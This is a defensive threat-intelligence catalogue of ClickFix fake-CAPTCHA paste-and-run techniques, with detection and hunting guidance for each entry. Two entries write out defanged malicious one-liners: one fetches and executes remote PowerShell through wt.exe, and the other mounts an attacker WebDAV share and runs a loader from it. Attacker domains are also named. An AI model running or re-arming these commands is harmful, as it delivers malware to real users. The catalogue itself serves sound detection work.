meta.title: ClickFix Command Catalog
meta.purpose: Defensive threat-intel reference of ClickFix (fake-CAPTCHA / paste-and-run) command patterns for detection engineering and threat hunting.
meta.warning: All commands are DEFANGED malicious samples for DETECTION ONLY. Do not execute. URLs neutralised (hxxp, [.]).

entries.technique: Clipboard self-execution — reads clipboard, clears it, and pipes to iex twice
entries.detection: PowerShell that calls Get-Clipboard then Invoke-Expression/iex in the same command line. Set-Clipboard with no argument (clipboard wipe) is a strong secondary signal.

entries.technique: Fake Cloudflare CAPTCHA variant — stores creds with cmdkey, loads a DLL filelessly from an attacker SMB/UNC share; persistence via scheduled task 'RunNotepadNow'
entries.detection: regsvr32 loading a DLL from a UNC/SMB path (\\host\...); cmdkey /add immediately before; creation of scheduled task named RunNotepadNow.

entries.technique: Remote HTA execution launched from the Run dialog after a fake 'verification' step
entries.detection: mshta.exe with a remote http(s) URL argument, spawned with a parent of explorer.exe (Run dialog) or a browser.

entries.technique: conhost --headless used to run a hidden PowerShell downloader without a visible window
entries.detection: Any execution of conhost.exe with the --headless argument is almost always malicious in this context.

entries.technique: Native curl download of a payload to %TEMP% then immediate execution
entries.detection: curl.exe writing to %TEMP%/%APPDATA% followed by start/execution of the same path within seconds, parented off the Run dialog.

entries.technique: BITS transfer used to fetch the payload, evading some download monitoring
entries.detection: bitsadmin /transfer to a user-writable path followed by execution; also visible as BITS job creation events.

entries.technique: Base64 -EncodedCommand to hide the real downloader/stager from casual inspection
entries.detection: powershell.exe with -EncodedCommand / -enc and -w hidden, especially with a RunMRU-originated parent chain. Decode the blob for the true command.

entries.technique: Silent install of a remote MSI hosted on attacker infrastructure
entries.detection: msiexec.exe /i with a remote http(s) URL and /q (quiet); rare in normal user activity from the Run dialog.

entries.technique: rundll32 loading an exported entry point from a DLL on a remote UNC/WebDAV share
entries.detection: rundll32.exe with a UNC/WebDAV (\\host\... or \\host@SSL\...) module path and an export name.

entries.technique: Program Compatibility Assistant used as a proxy to launch a remote binary and break the parent-child chain
entries.detection: pcalua.exe -a launching a binary, especially from a UNC path; unusual outside legacy-app troubleshooting.

entries.command: wt.exe -p "Windows PowerShell" powershell -NoProfile -W Hidden -c "iwr hxxps://enhanceblabber[.]cc/v | iex"
entries.technique: Fake CAPTCHA instructs Windows+X then I to open Windows Terminal (wt.exe) instead of Run, then paste/run PowerShell in a privileged shell that blends into admin workflows
entries.detection: Alert on wt.exe spawning powershell.exe/pwsh with network cmdlets (iwr/irm/iex); Terminal is rarely a parent of scripted download-and-execute

entries.technique: Fake Claude AI installer (MSIX) ClickFix; cmd splits the string 'powershell' across env vars with delayed expansion and calls 32-bit SysWOW64 PowerShell -E to evade string/path signatures
entries.detection: Hunt cmd.exe with /v:on and set-variable concatenation building 'powershell', or SysWOW64\...\v1.0\powershell.exe launched from cmd with -E/-EncodedCommand

entries.technique: ClickFix PowerShell loader uses runtime string substitution to indirectly construct irm (Invoke-RestMethod) and iex, fetching staged content executed in-memory without touching disk
entries.detection: Flag PowerShell where cmdlet names are assembled via concatenation ('ir'+'m','ie'+'x') and invoked with & ; correlate with outbound GET to /1.txt or /2.txt style stagers

entries.technique: ClickFix (Latrodectus) pastes a curl.exe download of a JavaScript file to %TEMP%, then executes it via cscript to launch the loader
entries.detection: Hunt curl.exe writing .js to %TEMP%/Downloads immediately followed by cscript/wscript executing that file; cscript with a user-writable path argument is high-signal

entries.technique: macOS ClickFix fake CAPTCHA; Terminal one-liner silently downloads a DMG to /tmp, mounts it with hdiutil -nobrowse, and auto-launches the bundled Atomic Stealer (AMOS) app
entries.detection: On macOS EDR, alert on curl -fsSL writing .dmg to /tmp followed by hdiutil attach -nobrowse and open of an app under /Volumes; chain within seconds of Terminal launch

entries.technique: Evolved macOS ClickFix retrieves a remote script from a /curl/<id> endpoint and pipes straight to bash through multi-stage scripts, increasingly launched via Script Editor rather than Terminal, ending in AMOS
entries.detection: Hunt curl piped directly to bash/sh with a /curl/ URL path; flag osascript/Script Editor (com.apple.ScriptEditor2) spawning curl or bash as anomalous parent
entries.source: Jamf Threat Labs / Microsoft Threat Intelligence

entries.technique: ACR Stealer ClickFix mounts an attacker WebDAV share over HTTPS with pushd, then rundll32 loads a remote DLL (odd extension e.g. .ct) directly from the DavWWWRoot mount
entries.detection: Alert on pushd to a \\host@SSL\DavWWWRoot UNC path and rundll32 loading a DLL with a non-.dll extension from a WebClient/WebDAV-mounted drive

entries.technique: Fake Google/Cloudflare 'verify you are human' page poisons clipboard with an irm|iex one-liner that pulls a stager from a bare-IPv4 host (StealC/ResiLoader)
entries.detection: powershell.exe running Invoke-RestMethod/irm against a raw IPv4 URL with -UseBasicParsing and piping to iex, with no browser-trusted parent process

entries.technique: macOS 'Google Meet audio fix' ClickFix lure; a base64-encoded URL is decoded inline and the fetched script is piped straight into zsh
entries.detection: Terminal/zsh spawning curl with a command-substituted 'base64 -D' URL piped to a shell; hunt shell history for 'base64 -D' feeding curl|zsh

entries.technique: ClickFix one-liner retrieves JSON from a /Fix endpoint and executes the nested '.note.body' property to launch a multi-stage PowerShell-to-RAT chain
entries.detection: powershell using Invoke-RestMethod where a response object property (e.g. .note.body / .body) is passed directly to IEX

entries.technique: ClickFix loads a DLL from an @SSL WebDAV share, disguised with a '.google' extension and invoked by ordinal '#1' (ACR Stealer WebDAV chain)
entries.detection: rundll32.exe loading a UNC path containing '@ssl' with a non-.dll file extension and an ordinal export (e.g. ',#1')
entries.source: Microsoft Defender Experts / Red Canary (via The Hacker News)

entries.technique: Fake-CAPTCHA ClickFix pastes an mshta one-liner that pulls remote HTA/script content from a hex-octal-obfuscated IP literal (0x5a) with a non-.hta extension (.gz/.odd/.dat); leads to .NET loader that extracts shellcode hidden via steganography in a PNG.
entries.detection: Alert on mshta.exe whose command line contains a bare IPv4/hex-octal host (e.g. '0x' in the hostname) and remote paths ending in .gz/.dat/.odd instead of .hta; mshta rarely fetches remote content on endpoints.

entries.technique: Fake-CAPTCHA ClickFix pastes a cmd one-liner that curls an attacker host whose URL path impersonates a trusted CDN (amazoncdn / cdn-dynmedia-1.microsoft.com) and pipes the response straight into powershell (no file drop, no iex); observed dropping Latrodectus and Supper.
entries.detection: Hunt for cmd.exe spawning curl.exe piped to powershell.exe where the URL host is a short unrelated domain but the path embeds 'amazoncdn'/'microsoft'/'cdn'; correlate with HKCU RunMRU entries.

entries.technique: macOS ClickFix 'fake utility' lure offers a one-click copy of an obfuscated curl one-liner that pipes a remotely fetched AppleScript directly into osascript (sibling variants pipe to zsh with base64+gzip+eval), bypassing Gatekeeper by never writing an app bundle; delivers infostealers with a t.me Telegram C2 fallback.
entries.detection: On macOS, alert when Terminal/osascript or zsh is the child of a curl|pipe execution fetching a remote script; inspect shell history and Unified Log for 'curl … | osascript' and lookups to honestly[.]ink / 0x666[.]info.

entries.command: "cmd.exe" /c net use Z: hxxps://94[.]156[.]170[.]255/webdav /persistent:no && "Z:\update.cmd" & net use Z: /delete
entries.technique: ClickFix pastes a cmd one-liner that mounts an attacker WebDAV server as drive Z:, runs a staged update.cmd loader, then unmaps the drive to clean up.
entries.detection: Alert on cmd.exe 'net use' mapping a drive letter to a raw-IP HTTPS/WebDAV path, immediately followed by execution of a .cmd/.bat from that mapped drive.
entries.source: Atos Threat Research (via The Hacker News)

entries.technique: ClickFix loads a remote 32-bit DLL over the WebDAV mini-redirector using a UNC path with the @80 HTTP port qualifier and calls export ordinal #1 (SkimokKeep loader), avoiding PowerShell entirely.
entries.detection: Hunt for rundll32.exe with a UNC/WebDAV path containing '@80' or '@443'/'@SSL' and an ordinal export (',#1'); pair with new WebClient service starts and outbound WebDAV traffic.

entries.technique: Fake-CAPTCHA ClickFix uses the legacy finger.exe LOLBin to retrieve an attacker-hosted script over TCP/79 and pipes the response straight into cmd for execution (KongTuke and SmartApeSG campaigns).
entries.detection: Flag any finger.exe execution (rare on modern hosts), especially outbound TCP/79 to non-corporate hosts and finger.exe spawning cmd.exe or powershell.exe as a child.

entries.technique: macOS ClickFix uses an applescript:// URL to open Script Editor with a tr-obfuscated AppleScript that runs curl -kSsfL to fetch a gzip stager piped into zsh, ending in Atomic Stealer (AMOS).
entries.detection: Correlate Script Editor / osascript launching curl with -kSsfL to a '/curl/<hex>' path, followed by base64/gzip decode piped to zsh and xattr -c on a /tmp Mach-O.

entries.technique: Fake 'Windows Update' ClickFix lure runs mshta against a hex-encoded-second-octet IP serving JScript from a non-.hta extension (.odd/.dat), which stages a PowerShell .NET steganographic loader hiding shellcode in PNG pixels (LummaC2/Rhadamanthys).
entries.detection: Hunt mshta.exe fetching URLs with hex-octet IPs (e.g. 0x62) and non-HTML extensions like .odd/.dat, then mshta spawning powershell.exe with in-memory download activity.
